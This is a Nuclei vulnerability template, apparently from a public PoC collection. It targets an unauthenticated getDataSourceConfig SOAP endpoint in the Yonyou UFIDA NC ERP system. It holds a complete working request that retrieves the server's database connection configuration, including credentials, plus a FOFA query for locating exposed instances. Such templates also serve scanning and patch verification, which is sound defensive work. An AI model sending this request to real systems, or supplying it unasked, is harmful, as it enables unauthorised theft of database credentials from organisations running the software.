id: yonyou-ufida-nc-getdatasourceconfig-info-leak

info:
  name: "用友 UFIDA NC getDataSourceConfig 接口数据库配置信息泄露"
  author: 0dayPoc
  severity: medium
  description: |-
    fofa: app.name="用友 UFIDA NC"
          用友UFIDA NC系统通过getDataSourceConfig接口未正确限制访问权限，导致攻击者可直接获取数据库连接配置信息。该漏洞可暴露数据库认证凭据及其他敏感配置参数。
  tags: 用友UFIDA

http:
- raw:
  - |
    POST /uapws/service/nc.itf.ses.inittool.SESInitToolService HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: JSESSIONID=57CC01E2D28AFE5F2A476BFF030D601A.ncServer; JSESSIONID=95BB77917927DCB24E2A01BDD1AB6CC1.ncServer
    Upgrade-Insecure-Requests: 1
    SOAPAction: urn:getDataSourceConfig
    Content-Type: text/xml;charset=UTF-8


    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ses="http://inittool.ses.itf.nc/SESInitToolService">
       <soapenv:Header/>
       <soapenv:Body>
          <ses:getDataSourceConfig/>
       </soapenv:Body>
    </soapenv:Envelope>
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'soap'
  - type: word
    part: body
    words:
    - 'datasource'
